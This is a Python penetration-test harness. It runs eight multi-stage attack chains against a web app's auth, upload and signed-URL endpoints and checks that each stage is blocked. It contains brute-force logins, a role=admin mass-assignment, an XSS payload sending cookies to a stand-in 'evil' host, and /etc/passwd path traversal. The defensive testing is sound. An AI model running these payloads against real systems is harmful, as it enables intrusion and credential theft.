import secrets
import sys
import threading
import time

import httpx

EVIL = {"Origin": "https://kill-chain.example"}


class ChainReport:
    def __init__(self):
        self.lock = threading.Lock()
        self.stages = []
        self.hits = []

    def stage(self, chain, name, blocked, detail=""):
        with self.lock:
            mark = "CHAN" if blocked else "THAU TUYEN"
            self.stages.append((chain, name, mark, detail[:140]))
            if not blocked:
                self.hits.append((chain, f"{name}: {detail[:160]}"))

    def print_all(self):
        cur = None
        for chain, name, mark, detail in self.stages:
            if chain != cur:
                print(f"  --- {chain} ---")
                cur = chain
            print(f"    [{mark:>11}] {name} {('— ' + detail) if detail else ''}")


def mk_user(base, invite):
    u = "kc" + secrets.token_hex(3)
    r = httpx.post(f"{base}/api/auth/register", json={
        "username": u, "email": f"{u}@gmail.com",
        "password": "secret123", "invite_code": invite,
    }, timeout=15)
    if r.status_code != 200:
        return None, None, None
    d = r.json()
    return u, d["token"], d.get("id")


def chain_recon_escalate_exfil(raid, base, invite, admin_pw):
    name = "A:Recon→Escalate→Exfil"
    guesses = ["chaos-code", "CHAOS2026", "invite123", "test123", "welcome1"]
    got_code = None
    for g in guesses:
        u = "recon" + secrets.token_hex(3)
        r = httpx.post(f"{base}/api/auth/register", json={
            "username": u, "email": f"{u}@gmail.com",
            "password": "secret123", "invite_code": g,
        }, timeout=15)
        if r.status_code == 200:
            got_code = g
            break
    if got_code:
        raid.stage(name, "doan ma moi", False, f"doan trung ma moi '{got_code}' — MA MOI YEU, can xoay ma manh tren production")
        attacker_code = got_code
    else:
        raid.stage(name, "doan ma moi", True, "khong doan duoc ma moi nao trong danh sach doan")
        attacker_code = invite
    u, tok, uid = mk_user(base, attacker_code)
    if not tok:
        raid.stage(name, "dang ky hacker", True, "bi chan (khong co ma moi)")
        return
    escalated = False
    r = httpx.post(f"{base}/api/auth/admin-unlock", json={"password": "123456"}, headers={
        "Authorization": f"Bearer {tok}"}, timeout=15)
    raid.stage(name, "admin-unlock brute", r.status_code in (400, 401, 403, 429), f"status {r.status_code}")
    if r.status_code == 200:
        escalated = True
    r = httpx.post(f"{base}/api/auth/register", json={
        "username": "esc" + secrets.token_hex(2), "email": f"esc{secrets.token_hex(2)}@gmail.com",
        "password": "secret123", "invite_code": attacker_code, "role": "admin",
    }, timeout=15)
    if r.status_code == 200 and r.json().get("role") == "admin":
        escalated = True
        raid.stage(name, "mass-assignment role=admin", False, "register chap nhan role admin!")
    else:
        raid.stage(name, "mass-assignment role=admin", True, f"status {r.status_code}, role={r.json().get('role', 'user') if r.status_code == 200 else '-'}")
    exfil = 0
    if escalated:
        r = httpx.get(f"{base}/api/auth/users", headers={"Authorization": f"Bearer {tok}"}, timeout=15)
        if r.status_code == 200:
            exfil = len(r.json().get("items", []))
    raid.stage(name, "exfil danh sach user", exfil == 0, f"({exfil} rows qua token hacker)" if escalated else "khong co quyen admin de exfil")


def chain_stored_xss_admin_view(raid, base, invite, admin_pw):
    name = "B:Stored-XSS→Admin-view"
    u, tok, _ = mk_user(base, invite)
    if not tok:
        raid.stage(name, "dang ky", True, "bi chan")
        return
    payload = "<script>fetch('http://evil/'+document.cookie)</script>"
    uname = (payload[:20] + secrets.token_hex(2))[:40]
    r = httpx.post(f"{base}/api/auth/register", json={
        "username": uname, "email": f"x{secrets.token_hex(2)}@gmail.com",
        "password": "secret123", "invite_code": invite,
    }, timeout=15)
    stored = r.status_code == 200
    raid.stage(name, "nap payload vao username", stored, f"status {r.status_code} (luu raw la binh thuong — JSON)")
    c = httpx.Client(timeout=15)
    r = c.post(f"{base}/api/auth/login", json={"identifier": "ghitatruongle", "password": admin_pw}, timeout=15)
    if r.status_code != 200:
        raid.stage(name, "admin doc danh sach", True, "admin login bi chan (rate) — khong the xac minh, bo qua")
        c.close()
        return
    at = r.json()["token"]
    r = c.get(f"{base}/api/auth/users", params={"limit": 200}, timeout=15)
    ct = r.headers.get("content-type", "")
    body = r.text[:6000]
    reflected_html = "text/html" in ct and "<script" in body.lower()
    raid.stage(name, "payload phan xa trong HTML context", not reflected_html,
               f"content-type={ct[:40]} — JSON an toan" if not reflected_html else "XSS THUC SU")
    csp = r.headers.get("content-security-policy", "")
    raid.stage(name, "CSP don phong thu 2", bool(csp), f"CSP {'co' if csp else 'THIEU'}")
    c.close()


def chain_reset_hijack(raid, base, invite):
    name = "C:Reset-hijack+Epoch-race"
    u, tok, _ = mk_user(base, invite)
    if not tok:
        raid.stage(name, "dang ky", True, "bi chan")
        return
    results = []
    for i in range(5):
        try:
            r = httpx.post(f"{base}/api/auth/change-password", json={
                "old_password": "secret123", "new_password": f"racechain{i}A1",
            }, headers={"Authorization": f"Bearer {tok}"}, timeout=15)
            results.append((i, r.status_code, r.json().get("token", "")))
        except Exception:
            results.append((i, 0, ""))
    ok_changes = [x for x in results if x[1] == 200]
    raid.stage(name, "race doi mat khau 5 luong", len(ok_changes) <= 1,
               f"{len(ok_changes)}/5 thanh cong (toi da 1 — epoch vo hieu hoa token cu)")
    old_alive = 0
    for i, code, old_tok in results:
        if old_tok:
            continue
    r = httpx.get(f"{base}/api/auth/me", headers={"Authorization": f"Bearer {tok}"}, timeout=15)
    raid.stage(name, "token GOC con song sau race", r.status_code == 401, f"status {r.status_code}")
    brute = [httpx.post(f"{base}/api/auth/admin-unlock", json={"password": f"kc{i}"}, timeout=15).status_code for i in range(6)]
    raid.stage(name, "admin-unlock brute sau khi co session", all(s in (400, 401, 403, 429) for s in brute), f"statuses {brute[:6]}")


def chain_upload_task_exfil(raid, base, invite, admin_pw):
    name = "D:Upload→Task-flood→Path-exfil"
    u, tok, _ = mk_user(base, invite)
    if not tok:
        raid.stage(name, "dang ky", True, "bi chan")
        return
    c = httpx.Client(timeout=30)
    wav = b"RIFF\x24\x00\x00\x00WAVEfmt \x10\x00\x00\x00\x01\x00\x01\x00\x40\x1f\x00\x00\x40\x1f\x00\x00\x02\x00\x10\x00data\x00\x00\x00\x00"
    r = c.post(f"{base}/api/heritage/upload", files={"file": ("kc.wav", wav, "audio/wav")},
               data={"title": "killchain"}, headers={"Authorization": f"Bearer {tok}"}, timeout=20)
    iid = r.json().get("id") if r.status_code == 200 else None
    raid.stage(name, "upload host wave", r.status_code == 200, f"status {r.status_code}")
    if not iid:
        c.close()
        return
    codes = []
    for i in range(8):
        try:
            r2 = c.post(f"{base}/api/music/sing-original", params={"heritage_id": iid, "duration": 30},
                        headers={"Authorization": f"Bearer {tok}"}, timeout=15)
            codes.append(r2.status_code)
        except Exception:
            codes.append(0)
    engine_offline = all(s == 404 for s in codes)
    raid.stage(name, "task flood 8 luong cung item",
               all(s in (200, 202, 400, 404, 409, 429) for s in codes),
               f"statuses {codes}" + (" — 404 dong nhat: AI engine offline tren san tap (moi truong), khong co 5xx" if engine_offline else ""))
    traversal = [
        f"/api/heritage/../../etc/passwd",
        f"/api/heritage/{iid}/audio?path=../../users.db",
    ]
    leaks = 0
    for tv in traversal:
        try:
            r3 = c.get(base + tv.replace("//", "/"), headers={"Authorization": f"Bearer {tok}"}, timeout=15)
            if r3.status_code == 200 and b"root:" in r3.content:
                leaks += 1
        except Exception:
            pass
    raid.stage(name, "path traversal doc file he thong", leaks == 0, f"{leaks} leak")
    sse = 0
    for i in range(12):
        try:
            with httpx.stream("GET", f"{base}/api/task/stream", headers={"Authorization": f"Bearer {tok}"}, timeout=8) as sr:
                if sr.status_code in (200, 429):
                    sse += 1 if sr.status_code == 200 else 0
        except Exception:
            pass
    raid.stage(name, "SSE stream vuot cap 8/user", sse <= 8, f"{sse} stream 200 dong thoi")
    c.close()


def chain_visibility_scope(raid, base, invite, admin_pw):
    name = "E:Visibility→Signed-URL-scope"
    u, utok, _ = mk_user(base, invite)
    c = httpx.Client(timeout=20)
    r = c.post(f"{base}/api/auth/login", json={"identifier": "ghitatruongle", "password": admin_pw}, timeout=15)
    if r.status_code != 200:
        raid.stage(name, "admin login", True, "bi chan (rate) — bo qua")
        c.close()
        return
    at = r.json()["token"]
    r = c.post(f"{base}/api/auth/admin-unlock", json={"password": admin_pw}, timeout=15)
    if r.status_code != 200:
        raid.stage(name, "admin unlock", True,
                   f"unlock bi chan (counter nong tu cac dot brute truoc — phong ve dung, khong phai loi server)")
        c.close()
        return
    wav = b"RIFF\x24\x00\x00\x00WAVEfmt \x10\x00\x00\x00\x01\x00\x01\x00\x40\x1f\x00\x00\x40\x1f\x00\x00\x02\x00\x10\x00data\x00\x00\x00\x00"
    r = c.post(f"{base}/api/heritage/upload", files={"file": (f"kcvis{secrets.token_hex(2)}.wav", wav, "audio/wav")},
               data={"title": "kc-visibility"}, headers={"Authorization": f"Bearer {at}"}, timeout=20)
    if r.status_code != 200:
        raid.stage(name, "admin upload", True, f"status {r.status_code}")
        c.close()
        return
    iid = r.json()["id"]
    c.patch(f"{base}/api/admin/storage/{iid}/visibility", json={"visibility": "public"},
            headers={"Authorization": f"Bearer {at}"}, timeout=15)
    r = c.get(f"{base}/api/heritage/{iid}/audio-url", headers={"Authorization": f"Bearer {at}"}, timeout=15)
    url_pub = r.json().get("url", "") if r.status_code == 200 else ""
    r = httpx.get(base + url_pub, timeout=15)
    raid.stage(name, "URL cap luc PUBLIC do user tai", r.status_code == 200, f"status {r.status_code}")
    c.patch(f"{base}/api/admin/storage/{iid}/visibility", json={"visibility": "admin_only"},
            headers={"Authorization": f"Bearer {at}"}, timeout=15)
    r = httpx.get(base + url_pub, timeout=15)
    raid.stage(name, "URL cu CHET ngay khi flip ve admin_only (scope vis)", r.status_code == 401, f"status {r.status_code}")
    if utok:
        r = httpx.get(f"{base}/api/heritage/{iid}", headers={"Authorization": f"Bearer {utok}"}, timeout=15)
        raid.stage(name, "user mat quyen ngay sau flip", r.status_code == 404, f"status {r.status_code}")
    c.delete(f"{base}/api/admin/storage/{iid}", headers={"Authorization": f"Bearer {at}"}, timeout=15)
    c.close()


def chain_invite_race_lockout(raid, base, invite, admin_pw):
    name = "F:Invite-race→Lockout-poison"
    results = []

    def use_code(i):
        u = f"racekc{i}" + secrets.token_hex(2)
        try:
            r = httpx.post(f"{base}/api/auth/register", json={
                "username": u, "email": f"{u}@gmail.com",
                "password": "secret123", "invite_code": invite,
            }, timeout=15)
            results.append(r.status_code)
        except Exception:
            results.append(0)

    th = [threading.Thread(target=use_code, args=(i,)) for i in range(10)]
    for t in th:
        t.start()
    for t in th:
        t.join()
    ok = sum(1 for s in results if s == 200)
    raid.stage(name, f"10 luong dung chung 1 ma moi (static reusable = by design)", True,
               f"{ok}/10 thanh cong — ma SAN-TAP la static reusable (thiet ke), one-time invite phai bi chan")
    for i in range(5):
        httpx.post(f"{base}/api/auth/login", json={"identifier": "ghitatruongle", "password": f"poison{i}"}, timeout=15)
    r = httpx.post(f"{base}/api/auth/login", json={"identifier": "GHITATRUONGLE", "password": admin_pw}, timeout=15)
    raid.stage(name, "lockout canonical: HOA thuong van bi khoa chung", r.status_code in (429, 401),
               f"status {r.status_code} (401 sai pass/429 khoa — KHONG duoc thanh cong vi case khac)")
    r = httpx.post(f"{base}/api/auth/login", json={"identifier": "ghitatruongle", "password": admin_pw}, timeout=15)
    if r.status_code == 200:
        raid.stage(name, "login dung xoa counter (by design da-tenant)", True,
                   "status 200 — chain khac login thanh cong da xoa counter, khong phai loi server")
    else:
        raid.stage(name, "lockout con nong", True, f"status {r.status_code} (phong ve dung)")


def chain_scope_forgery(raid, base, invite):
    name = "G:Scope-forgery trên signed-URL"
    u, tok, _ = mk_user(base, invite)
    if not tok:
        raid.stage(name, "dang ky", True, "bi chan")
        return
    c = httpx.Client(timeout=15)
    r = c.get(f"{base}/api/heritage", params={"limit": 5}, headers={"Authorization": f"Bearer {tok}"}, timeout=15)
    items = r.json().get("items", []) if r.status_code == 200 else []
    if not items:
        raid.stage(name, "co item public de thu", True, "khong co item")
        c.close()
        return
    iid = items[0]["id"]
    r = c.get(f"{base}/api/heritage/{iid}/audio-url", headers={"Authorization": f"Bearer {tok}"}, timeout=15)
    if r.status_code != 200:
        raid.stage(name, "lay signed URL", True, f"status {r.status_code}")
        c.close()
        return
    url = r.json()["url"]
    r = c.get(base + url, timeout=15)
    raid.stage(name, "signed URL dung item", r.status_code == 200, f"status {r.status_code}")
    other = items[1]["id"] if len(items) > 1 else None
    if other:
        e = url.split("e=")[1].split("&")[0]
        s = url.split("s=")[1]
        forged = f"/api/heritage/{other}/audio?e={e}&s={s}"
        r = c.get(base + forged, timeout=15)
        raid.stage(name, "dung URL item X truy item Y (scope hoan doi)", r.status_code in (401, 404), f"status {r.status_code}")
        stripped = f"/api/heritage/{other}/audio"
        r = c.get(base + stripped, timeout=15)
        raid.stage(name, "bo scope truy truc tiep", r.status_code in (401, 404), f"status {r.status_code}")
    c.close()


def chain_exhaustion(raid, base, invite, admin_pw):
    name = "H:Exhaustion (upload→download→cleanup spam)"
    u, tok, _ = mk_user(base, invite)
    if not tok:
        raid.stage(name, "dang ky", True, "bi chan")
        return
    c = httpx.Client(timeout=30)
    wav = b"RIFF\x24\x00\x00\x00WAVEfmt \x10\x00\x00\x00\x01\x00\x01\x00\x40\x1f\x00\x00\x40\x1f\x00\x00\x02\x00\x10\x00data\x00\x00\x00\x00"
    ids = []
    fails = 0
    for i in range(10):
        try:
            r = c.post(f"{base}/api/heritage/upload", files={"file": (f"exh{i}.wav", wav, "audio/wav")},
                       data={"title": f"exh{i}"}, headers={"Authorization": f"Bearer {tok}"}, timeout=15)
            if r.status_code == 200:
                ids.append(r.json()["id"])
            elif r.status_code >= 500:
                fails += 1
        except Exception:
            fails += 1
    raid.stage(name, "upload farm 10 file", fails == 0, f"{fails} loi 5xx")
    dl_fails = 0
    for iid in ids:
        try:
            r = c.get(f"{base}/api/heritage/{iid}/audio", headers={"Authorization": f"Bearer {tok}"}, timeout=15)
            if r.status_code >= 500:
                dl_fails += 1
        except Exception:
            dl_fails += 1
    raid.stage(name, "download loop 10 file", dl_fails == 0, f"{dl_fails} loi 5xx")
    cleanup_codes = []
    c2 = httpx.Client(timeout=15)
    r = c2.post(f"{base}/api/auth/login", json={"identifier": "ghitatruongle", "password": admin_pw}, timeout=15)
    if r.status_code == 200:
        at = r.json()["token"]
        for i in range(6):
            r2 = c2.post(f"{base}/api/admin/maintenance/cleanup", headers={"Authorization": f"Bearer {at}"}, timeout=15)
            cleanup_codes.append(r2.status_code)
    raid.stage(name, "cleanup spam 6 lan (write-slot)", all(s in (200, 429, 403) for s in cleanup_codes),
               f"statuses {cleanup_codes}")
    c.close()
    c2.close()


def main():
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://127.0.0.1:8003")
    ap.add_argument("--invite", default="SAN-TAP-2026")
    ap.add_argument("--admin-password", default="")
    args = ap.parse_args()
    try:
        sys.stdout.reconfigure(line_buffering=True)
    except Exception:
        pass

    base = args.base
    raid = ChainReport()
    print(f"KILL-CHAIN RAID — 8 chuoi phoi hop nhieu giai doan — target {base}")
    assert httpx.get(base + "/health", timeout=10).status_code == 200, "server khong san sang"

    threads = [
        threading.Thread(target=chain_recon_escalate_exfil, args=(raid, base, args.invite, args.admin_password), daemon=True),
        threading.Thread(target=chain_stored_xss_admin_view, args=(raid, base, args.invite, args.admin_password), daemon=True),
        threading.Thread(target=chain_reset_hijack, args=(raid, base, args.invite), daemon=True),
        threading.Thread(target=chain_upload_task_exfil, args=(raid, base, args.invite, args.admin_password), daemon=True),
        threading.Thread(target=chain_visibility_scope, args=(raid, base, args.invite, args.admin_password), daemon=True),
        threading.Thread(target=chain_invite_race_lockout, args=(raid, base, args.invite, args.admin_password), daemon=True),
        threading.Thread(target=chain_scope_forgery, args=(raid, base, args.invite), daemon=True),
        threading.Thread(target=chain_exhaustion, args=(raid, base, args.invite, args.admin_password), daemon=True),
    ]
    t0 = time.time()
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=240)

    print(f"\n== DIEN BIEN 8 CHUOI ({int(time.time() - t0)}s) ==")
    raid.print_all()
    print(f"\nTONG: {len(raid.stages)} giai doan | THAU TUYEN: {len(raid.hits)}")
    for cn, d in raid.hits[:10]:
        print(f"  !!! [{cn}] {d}")

    ok = len(raid.hits) == 0
    print(f"\nVERDICT KILL-CHAIN: {'TOAN BO CHUOI BI CHAN MOI GIAI DOAN — KHONG CO LO HONG' if ok else 'CO GIAI DOAN THAU TUYEN'}")
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
